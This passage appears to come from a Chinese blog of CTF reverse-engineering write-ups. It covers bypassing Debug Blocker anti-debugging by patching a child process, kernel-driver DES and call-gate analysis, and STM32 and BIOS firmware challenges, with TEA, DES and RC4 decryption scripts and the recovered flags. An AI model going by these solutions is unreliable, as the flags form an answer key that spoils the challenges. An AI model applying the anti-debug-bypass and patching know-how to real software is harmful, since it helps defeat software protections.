<span class="number">236</span>, <span class="number">118</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">243</span>, <span class="number">6</span>])</span><br><span class="line">key = <span class="string">b'Ez_5M4_C1pH@r!!!'</span></span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">c1 = bytes_to_long(c[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">c2 = bytes_to_long(c[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">flag1 = decrypt(c1, key)</span><br><span class="line">flag2 = decrypt(c2, key)</span><br><span class="line">flag = long_to_bytes(flag1)+long_to_bytes(flag2)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#42b061b4cb41cfa89ca78047bde1856e</span></span><br></pre></td></tr></table></figure><h3 id="child-protect"><a href="#child-protect" class="headerlink" title="child_protect"></a>child_protect</h3><p>拿了二血。。</p><p>从题目名字就想到考点可能是程序自我创建反调试，升级一点就是Debug Blocker技术。尝试下了断点，发现不会断下。然后使用</p><p>procexp查看程序：果然，正如题目名字。</p><p><img src="https://i.loli.net/2021/02/03/NFq5Iep92wZAPGv.png" alt="image-20210202222147793"></p><blockquote><p><strong>Debug Blocker技术特点：</strong></p><ul><li><strong>调试器与被调试器关系中，调试进程与被调试进程首先是一种父子关系。</strong></li><li><strong>子进程进程已经被调试，不能在被其他调试器调试</strong></li><li><strong>强制终止调试进程以切断调试器-被调试器关系时，被调试进程也会同时终止。</strong></li><li><strong>父进程操作被子进程的代码</strong></li><li><strong>父进程处理被子进程中发生的异常</strong></li></ul></blockquote><p>来到creatprocess函数的地方看看：首先创建一个互斥体，目的是为了区别当前运行的是子进程还是父进程，进而执行不同的分支。接下来创建了一个进程。<br><img src="https://i.loli.net/2021/02/03/dtHyc9rBTIlAVXu.png" alt="image-20210202222344171"></p><p><img src="https://i.loli.net/2021/02/03/AUKzcsI8Wl6R1Sx.png" alt="image-20210202223940336"></p><p>然后就是子进程与父进程交互的过程：<br><img src="https://i.loli.net/2021/02/03/Gykoqiu7s1fL3Zg.png" alt="image-20210202224313171"></p><p>具体交互过程：可以看到就2个，那我们不用把程序调试起来，直接手动或idapython修改子进程就行了。</p><p><img src="https://i.loli.net/2021/02/03/sFOHkW1pPUYeGQJ.png" alt="image-20210202224637602"></p><p>第一个就当作花指令处理nop掉多余代码，对于第二个：其实就是把函数中的0x8e32cdaa修改为0x73FF8CA6。</p><p><img src="https://i.loli.net/2021/02/03/zM9IE7ajLCnZOJW.png" alt="image-20210202225101786"></p><p>把修复好的代码反编译：</p><p><img src="https://i.loli.net/2021/02/03/mzFKL9OIEYrMt7y.png" alt="image-20210202225507005"></p><p>对于生成的key，因为计算有点繁琐，这里可以直接在程序运行时修改eip到sub_4110B9函数这里，然后当程序执行到后面时直接查看key。</p><p>最后的tea加密，只是多了一个变换字节序的操作，写解密时注意一下：</p><p><img src="https://i.loli.net/2021/02/03/JDPd89soM2nTCh5.png" alt="image-20210202225850439"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123;<span class="number">0xed</span>, <span class="number">0xe9</span>, <span class="number">0x8b</span>, <span class="number">0x3b</span>, <span class="number">0xd2</span>, <span class="number">0x85</span>, <span class="number">0xe7</span>, <span class="number">0xeb</span>, <span class="number">0x51</span>, <span class="number">0x16</span>, <span class="number">0x50</span>, <span class="number">0x7a</span>, <span class="number">0xb1</span>, <span class="number">0xdc</span>, <span class="number">0x5d</span>, <span class="number">0x9</span>, <span class="number">0x45</span>, <span class="number">0xae</span>, <span class="number">0xb9</span>, <span class="number">0x15</span>, <span class="number">0x4d</span>, <span class="number">0x8d</span>, <span class="number">0xff</span>, <span class="number">0x50</span>,</span><br><span class="line"> <span class="number">0xde</span>, <span class="number">0xe0</span>, <span class="number">0xbc</span>, <span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xbc</span>, <span class="number">0xfe</span>, <span class="number">0xe1</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[] = &#123;<span class="number">0x82ABA3FE</span>, <span class="number">0x0AC1DDCA8</span>, <span class="number">0x87EC6B60</span>, <span class="number">0x0A2394568</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> enc[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = enc[i];</span><br><span class="line">enc[i] = enc[<span class="number">3</span>-i];</span><br><span class="line">enc[<span class="number">3</span>-i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v11 = <span class="number">0x73FF8CA6</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) <span class="comment">//交换字节序</span></span><br><span class="line">&#123;</span><br><span class="line">swap(enc+i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> delat = <span class="number">0xc6ef3720</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>) -= ((*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">3</span>))^(delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))))^((*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">2</span>));</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))) -= ((*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)+<span class="number">1</span>)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">1</span>))^(delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))^((*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">0</span>));</span><br><span class="line">delat += <span class="number">0x61c88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) <span class="comment">//0xc6ef3720</span></span><br><span class="line">&#123;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc + <span class="number">4</span> * i) ^= v11;</span><br><span class="line">v11 -= <span class="number">0x50FFE544</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) <span class="comment">//交换字节序</span></span><br><span class="line">&#123;</span><br><span class="line">swap(enc+i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内核安全"><a href="#内核安全" class="headerlink" title="内核安全"></a>内核安全</h2><h3 id="easy-kernel"><a href="#easy-kernel" class="headerlink" title="easy_kernel"></a>easy_kernel</h3><p>题目给了一个r3层的程序和一个驱动程序。</p><p>首先r3层程序的情况：红色部分的调用是重点。。</p><p><img src="https://i.loli.net/2021/02/03/diJGIjlXLyp41fr.png" alt="image-20210202231743748"></p><p>然后看看对于驱动文件情况：我们主要关注的就是偏移量为<strong>IRP_MJ_DEVICE_CONTROL</strong>的部分。<br><img src="https://i.loli.net/2021/02/03/QjNn86sM4qOavhE.png" alt="image-20210202232137464"></p><p>进入sub_401270，查看r0层对r3层发出请求的处理：看到0x222000正是r3层程序的值，开始一直以为这里key，正好8个字节，，因为识别了后面的算法为des。</p><p><img src="https://i.loli.net/2021/02/03/Zkvi2DSbAysKo3Y.png" alt="image-20210202232225017"></p><p>后面的des加密很好识别出来，然后开始使用密文和上面以为的key解密，不对，猜测也是。。因为r3层红色地方的调用我没搞清楚的。。</p><p>感觉还是调试起来才能做了，在本地这个驱动服务也没启动起来，然后找了个xp，成功调试起来。首先从des加密结果发现key其实是假flag的前8位且后面还有一个加密操作。才发现这个其实和从r3传过来的参数是对应的，-1这个标志很明显了。。。</p><p><img src="https://i.loli.net/2021/02/03/oDNEmCe5pUcMjr2.png" alt="image-20210202233155105"></p><p>接下来就是看最后的红色代码调用，但只能单步步过，一单步步入就蓝屏😪。。也没心情去找原因。。</p><p>但我猜想这个最后加密肯定是不难的，，开始没注意以为是类似单表加密的，那我可以把0-255的每个加密值找到，再替换一下，试了多组数据后，发现了端倪。。并不是类似单表加密，看了一会了，，发现就是从一位开始一次异或后一位。。hha…</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> des, ECB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(a)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">tmp = a[i]</span><br><span class="line">a[i] = a[<span class="number">3</span>-i]</span><br><span class="line">a[<span class="number">3</span>-i] = tmp</span><br><span class="line"><span class="keyword">return</span> a[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">178</span>, <span class="number">196</span>, <span class="number">134</span>, <span class="number">213</span>,  <span class="number">84</span>, <span class="number">108</span>,  <span class="number">56</span>, <span class="number">173</span>, <span class="number">189</span>, <span class="number">105</span>, </span><br><span class="line">  <span class="number">212</span>, <span class="number">233</span>,  <span class="number">68</span>,  <span class="number">71</span>,  <span class="number">54</span>,  <span class="number">33</span>, <span class="number">153</span>, <span class="number">145</span>, <span class="number">251</span>,  <span class="number">19</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">228</span>, <span class="number">128</span>,  <span class="number">18</span>, <span class="number">226</span>,  <span class="number">67</span>,  <span class="number">42</span>,  <span class="number">75</span>, </span><br><span class="line">   <span class="number">73</span>, <span class="number">142</span>]</span><br><span class="line">   </span><br><span class="line"><span class="string">'''  </span></span><br><span class="line"><span class="string">ans = []</span></span><br><span class="line"><span class="string">for i in range(0, 32, 4):</span></span><br><span class="line"><span class="string">ans += swap(enc[i:])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">enc[i] ^= enc[i+<span class="number">1</span>]</span><br><span class="line">enc = bytes(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'&#125;aglf_T_'</span></span><br><span class="line"></span><br><span class="line">des_obj = des(key, ECB, pad = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">code = des_obj.decrypt(enc)</span><br><span class="line">print(code)</span><br><span class="line"><span class="comment">#flag&#123;WelcOme_to_kerne1_world!&#125;</span></span><br></pre></td></tr></table></figure><p>题虽然是做了，但上面红色部分的调用到底是什么呢。</p><p>经过一番搜索，首先从<strong>call fword ptr</strong>知道了这是个长调用，fword代表6个字节。而要想弄清处这个就要了解windows保护模式中的长调用和调用门，段描述符及段选择子的知识了。</p><p>这里就只简单涉及与本题相关的：</p><blockquote><ul><li><strong>长调用开始是push调用者的CS和返回地址。因为最后返回也是多了操作，所以使用的retf</strong>。</li><li><strong>GDTR 寄存器存放的是GDT（全局描述符表）表的位置和大小，低两字节是gdt表的大小，高四字节是gdt表的地址。</strong></li><li><strong>sgdt指令读取GDTR寄存器的值。</strong></li><li><strong>段选择子是一个16位的描述符，指向了定义该段的段描述符，而我们的长调用也就是使用的段选择子来决定。其中3至15位是一个索引，在GDT表中查找出段描述符；第1，2位为RPL，代表了请求特权的级别，如0，3；第三位为TI，如果为0，查GDT表。如果为1，查LDT表，windows中只用GDT，所以这位都是0。</strong></li><li><strong>调用门描述符，共8字节。高16-31位记录偏移地址的高地址，低0-15位记录偏移地址的低地址。低16-31位即是段选择子。</strong></li></ul></blockquote><p>再来看看调用门，指令格式<strong>CALL CS:EIP</strong>，注：EIP是没有使用的，也就是我们的长调用只看段寄存器CS的值，通过它找到对应的段描述符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">段寄存器的结构：</span><br><span class="line">WORD Selectot  <span class="comment">//段选择子</span></span><br><span class="line">WORD Attribute  <span class="comment">//属性，段描述符高四字节的第8位开始 到第23位结束</span></span><br><span class="line">DWORD Base   <span class="comment">//基地址</span></span><br><span class="line">DWORD Limit <span class="comment">//界限</span></span><br></pre></td></tr></table></figure><p>直接看题目中的：</p><p><img src="https://i.loli.net/2021/02/03/dmlE6NWgAMcjuOT.png" alt="image-20210203222138750"></p><p> 所以说要发现调用的地方，真正关心的地方是48h。<strong>执行的代码地址 = （门描述符中段选择子所指向的代码段的Base）+（门描述符高四字节的16-31位）+（门描述符低四字节的0-15位）。</strong></p><p>那题目在哪里找这个段描述符表？就是之前看过的DeviceIoControl的地方，那8个字节的数据。</p><p><img src="https://i.loli.net/2021/02/03/LTtVxlOFIEq8MHk.png" alt="image-20210203224418059"></p><p>再把调用代码中的段选择子分解一下（48h），得到3-16位的index：1001b = 9。这正好和r0层看到的一样。</p><p>最后就是从这8字节数据得到长调用函数地址了：</p><p><img src="https://i.loli.net/2021/02/03/aVrpT5UY1i7usmy.png" alt="image-20210203225024841"></p><p>回到r3层验证一下：</p><p><img src="https://i.loli.net/2021/02/03/CTPLONiF39QSxrV.png" alt="image-20210203225120306"></p><h2 id="固件安全"><a href="#固件安全" class="headerlink" title="固件安全"></a>固件安全</h2><h3 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a><strong>NodeMCU</strong></h3><p>50分的值，直接ctrl+f找到flag。。</p><h3 id="STM"><a href="#STM" class="headerlink" title="STM"></a>STM</h3><p>知道了stm文件，而STM32其实是使用了ARM核的MCU。</p><p>这个我们可以用ida分析的，但要设置一下，不然ida也只是把它当成data文件看待。</p><p>首先设置架构：</p><p><img src="https://i.loli.net/2021/02/03/8tCAfWjSNszmL6Y.png" alt="image-20210203000903224"></p><p>编辑选项：</p><p><img src="https://i.loli.net/2021/02/03/9AFywDxIStoTVCM.png" alt="image-20210203004015462"></p><p>然后确定，把加载地址改为：0x08000000。进入后把开始的数据都转化为4字节型数据：</p><p><img src="https://i.loli.net/2021/02/03/gnX8JZ9KfrIiqBw.png" alt="image-20210203002010284"></p><p>双击第二个跳转到指定位置，然后在指定位置上面一些地方把数据转化为代码。可以发现ida左边出现了好几个函数。简单找一下即可看见关键函数，使用idapython按照它的算法逻辑打印出计算结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">addr = <span class="number">0x08000344</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x0800036E</span>:</span><br><span class="line">    flag += chr((get_byte(addr)^<span class="number">0x1e</span>)+<span class="number">3</span>)</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;1749ac10-5389-11eb-90c1-001c427bd493&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easy-bios"><a href="#easy-bios" class="headerlink" title="easy_bios"></a>easy_bios</h3><p>首先将bios文件使用模拟器运行起来，从这得到了关键的字符串信息。</p><p><img src="https://i.loli.net/2021/02/03/fc7N3CXovWQD8ed.png" alt="image-20210203004245893"></p><p>尝试使用binwalk提取bios中的文件看看，提取出一个名为840A8的文件。</p><p>用010editor查看，发现了熟悉4D5A和紧跟着的5045，PE文件啊。。</p><p><img src="https://i.loli.net/2021/02/03/aIQTxqshEpv9oOm.png" alt="image-20210203005019542"></p><p>突然想到刚刚得到的关键字符信息，尝试搜索看看，找到了Getflag，其它字符换用unicode形式。突然明朗起来：</p><p><img src="https://i.loli.net/2021/02/03/XCFTuydJxGANan9.png" alt="image-20210203005236702"></p><p>但要注意的是这个文件中很多个PE文件，提取出出现Getflag字符串的PE文件，进行反编译：</p><p>从字符串定位到关键函数：再从Your Input定位到v12是我们的输入。<br><img src="https://i.loli.net/2021/02/03/aJQd1xwo76COHX2.png" alt="image-20210203124346558"></p><p>然后对于rc4加密，我们只关心最后的异或值，程序又运行不起来的，那把整个函数复制到到C编译器中简单修改一下再直接用来异或解密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">70</span>, <span class="number">119</span>, <span class="number">116</span>, <span class="number">176</span>, <span class="number">39</span>, <span class="number">142</span>, <span class="number">143</span>, <span class="number">91</span>, <span class="number">233</span>, <span class="number">216</span>, </span><br><span class="line">  <span class="number">70</span>, <span class="number">156</span>, <span class="number">114</span>, <span class="number">231</span>, <span class="number">47</span>, <span class="number">94</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"OVMF_And_Easy_Bios"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v13[<span class="number">514</span>] = &#123;<span class="number">0</span>&#125;, v2, v3, v4, v5, v6, v8;</span><br><span class="line"><span class="keyword">int</span> v7, v9, v10, v11, v12, result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13[i] = i;</span><br><span class="line">    v13[i + <span class="number">256</span>] = s[i % <span class="number">18</span>];</span><br><span class="line">  &#125;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v4 = v13[v2];</span><br><span class="line">v3 = (v13[v2 + <span class="number">256</span>] + v4 + v3) % <span class="number">256</span>;</span><br><span class="line">v5 = v13[v3];</span><br><span class="line">v13[v3] = v4;</span><br><span class="line">v13[v2++] = v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v2 != <span class="number">256</span> );</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v8 = (v8 + <span class="number">1</span>);</span><br><span class="line">    v9 = v13[v8];</span><br><span class="line">    v10 = (v9 + v7) % <span class="number">256</span>;</span><br><span class="line">    v11 = v13[v10];</span><br><span class="line">    v13[v10] = v9;</span><br><span class="line">    v7 = (v9 + v7) % <span class="number">256</span>;</span><br><span class="line">    v13[v8] = v11;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13[(v11 + v13[v10]) % <span class="number">256</span>];</span><br><span class="line">    enc[v6++] ^= result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v6 != <span class="number">16</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//88baec0b5154f859b5851097bb567f5c</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF</title>
      <link href="/2021/01/26/DJBCTF/"/>
      <url>/2021/01/26/DJBCTF/</url>
      
        <content type="html"><![CDATA[<p>整体感觉Re有点偏杂，有收获，主要是拿了个杯子，hha。。</p><a id="more"></a><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="A-Maze-In"><a href="#A-Maze-In" class="headerlink" title="A-Maze-In"></a>A-Maze-In</h3><p>迷宫题，但是有点特别，就是每个步骤对应的地图不一样。。</p><p><img src="/2021/01/26/DJBCTF/image-20210126111337271-1611648503131.png" alt="image-20210126111337271"></p><p>提取出4个地图后，开始手走了一下，要命。。想到写一个dfs来搜索，这个应该是可行的，但我没有注意好走过的路径标记导致一直陷入了循环，找不解。。</p><p>后面从逆向的角度看，这个虽然正着走麻烦，但是从终点走到起点是每一步都确定的，走那一步看它反方向是不是为1即可。</p><p>因为每一步确定还是比较好走的：<strong>LLDRRDLLLDRDLDDDRRULURRULURRDDDLDR</strong></p><p>赛后对我之前写的dfs，发现主要是每次往回走导致一直陷入一个死胡同，就是走了L然后走R，那每次走之前加了个判断试试。。果然，秒出。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> byte_404018[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span 